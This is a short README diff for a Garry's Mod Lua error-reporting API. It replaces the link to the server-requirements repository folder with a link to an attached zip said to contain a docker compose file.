@@ -6,6 +6,6 @@ It requires a web stack to be accessible. Something like NGINX, PHP, MySQL, your
 
 For now the API is only in use by gm_construct 13 beta Error library: https://github.com/Xalalau/GMod-Lua-Error-API
 
-Server requirements: https://github.com/Xalalau/docker-stacks/tree/master/gmoderror
+Server requirements (read this docker compose file): [gmoderror.zip](https://github.com/user-attachments/files/17177742/gmoderror.zip)
 
 My usage: https://gerror.xalalau.com/
